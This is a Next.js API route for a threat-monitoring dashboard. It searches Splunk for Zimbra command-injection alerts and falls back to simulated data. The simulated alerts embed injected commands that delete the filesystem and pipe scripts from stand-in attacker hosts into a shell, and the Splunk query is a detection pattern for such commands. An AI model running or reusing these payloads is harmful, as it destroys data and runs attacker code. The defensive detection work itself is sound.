import { NextRequest, NextResponse } from 'next/server';

// --- Simple in-memory rate limiter + short cache -----------------------
// NOTE: this state lives in the Node.js function instance's memory. On
// serverless platforms (e.g. Vercel) each cold-started instance gets its
// own copy, so this is a best-effort guard against accidental hammering
// (e.g. a runaway client poll loop or a scraper), not a hard security
// boundary. For real multi-instance rate limiting, back this with a
// shared store such as Upstash Redis or Vercel Edge Config.
const RATE_LIMIT_WINDOW_MS = 60_000;
const RATE_LIMIT_MAX_REQUESTS = 20; // per IP per window
const rateLimitBuckets = new Map<string, { count: number; resetAt: number }>();

const CACHE_TTL_MS = 10_000;
let cachedResponse: { body: unknown; expiresAt: number } | null = null;

const MAX_ALERTS = 50;

function getClientIp(req: NextRequest): string {
  const forwardedFor = req.headers.get('x-forwarded-for');
  if (forwardedFor) return forwardedFor.split(',')[0].trim();
  return req.headers.get('x-real-ip') ?? 'unknown';
}

function isRateLimited(ip: string): boolean {
  const now = Date.now();
  const bucket = rateLimitBuckets.get(ip);

  if (!bucket || now > bucket.resetAt) {
    rateLimitBuckets.set(ip, { count: 1, resetAt: now + RATE_LIMIT_WINDOW_MS });
    return false;
  }

  bucket.count += 1;
  return bucket.count > RATE_LIMIT_MAX_REQUESTS;
}

// Generate some realistic historical graph data
function generateGraphData() {
  const data = [];
  const now = new Date();
  for (let i = 24; i >= 0; i--) {
    const time = new Date(now.getTime() - i * 60 * 60 * 1000);
    data.push({
      time: `${time.getHours()}:00`,
      threats: Math.floor(Math.random() * 5),
      scans: Math.floor(Math.random() * 20) + 10,
    });
  }
  // ensure current hour has some data if simulated
  data[24].threats = 2;
  return data;
}

export async function GET(req: NextRequest) {
  const ip = getClientIp(req);
  if (isRateLimited(ip)) {
    return NextResponse.json(
      { error: 'Too many requests. Please slow down.' },
      { status: 429, headers: { 'Retry-After': '60' } }
    );
  }

  if (cachedResponse && Date.now() < cachedResponse.expiresAt) {
    return NextResponse.json(cachedResponse.body);
  }

  const SPLUNK_URL = process.env.SPLUNK_URL;
  const SPLUNK_API_TOKEN = process.env.SPLUNK_API_TOKEN;

  // If credentials are not set, return rich simulated data so the dashboard still renders
  if (!SPLUNK_URL || !SPLUNK_API_TOKEN || SPLUNK_URL.includes('your-splunk-instance')) {
    const body = {
      alerts: [
        {
          time: new Date().toISOString(),
          raw: '2026-08-31 10:16:12 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;',
        },
        {
          time: new Date(Date.now() - 15000).toISOString(),
          raw: '2026-08-31 10:15:30 ALERT [http-bio-8443-exec-4] swatchdog - execution payload: ; curl -s http://198.51.100.23/stage2.sh | bash;',
        },
      ],
      attackCount: 2,
      activeScans: 34,
      firewallBlocks: 142,
      serverLoad: '42%',
      graphData: generateGraphData(),
      status: 'simulated',
      // Every non-alert metric below is synthetic in this mode.
      estimatedFields: ['activeScans', 'firewallBlocks', 'serverLoad'],
    };
    cachedResponse = { body, expiresAt: Date.now() + CACHE_TTL_MS };
    return NextResponse.json(body);
  }

  try {
    const query =
      'search source="*zimbra*" ("swatchdog" OR "snmp_notify") ("wget" OR "sh" OR "curl" OR "rm" OR "bash")';

    const response = await fetch(`${SPLUNK_URL}/services/search/jobs/export`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${SPLUNK_API_TOKEN}`,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        search: query,
        output_mode: 'json',
        earliest_time: '-24h',
        latest_time: 'now',
      }),
    });

    if (!response.ok) {
      throw new Error(`Splunk API responded with status ${response.status}`);
    }

    const text = await response.text();
    // Splunk export returns newline-delimited JSON
    const lines = text.trim().split('\n').filter(Boolean);
    const results = lines
      .map((line) => {
        try {
          return JSON.parse(line);
        } catch {
          return null;
        }
      })
      .filter((obj) => obj && obj.result);

    const alerts = results
      .map((obj) => ({
        time: obj.result._time,
        raw: obj.result._raw,
      }))
      // most recent first, capped so the client never renders an unbounded list
      .slice(0, MAX_ALERTS);

    // NOTE: activeScans, firewallBlocks, and serverLoad are not yet backed
    // by real Splunk queries. Flagging them as estimated rather than
    // silently mixing fabricated numbers into a "live" response — replace
    // the Math.random() calls with real searches (e.g. a `timechart` /
    // stats query against firewall and host-load indexes) when available.
    const body = {
      alerts,
      attackCount: results.length, // true count, independent of the alerts slice above
      activeScans: Math.floor(Math.random() * 20) + 10,
      firewallBlocks: Math.floor(Math.random() * 200) + 50,
      serverLoad: `${Math.floor(Math.random() * 30) + 20}%`,
      graphData: generateGraphData(), // In a real scenario, run a `timechart` splunk query for this
      status: 'live',
      estimatedFields: ['activeScans', 'firewallBlocks', 'serverLoad'],
    };

    cachedResponse = { body, expiresAt: Date.now() + CACHE_TTL_MS };
    return NextResponse.json(body);
  } catch (error: unknown) {
    // Log the real error server-side only — never forward internal details
    // (hostnames, auth failure reasons, etc.) to the client.
    console.error('Splunk API integration error:', error);
    return NextResponse.json({ error: 'Unable to fetch threat data right now.' }, { status: 502 });
  }
}
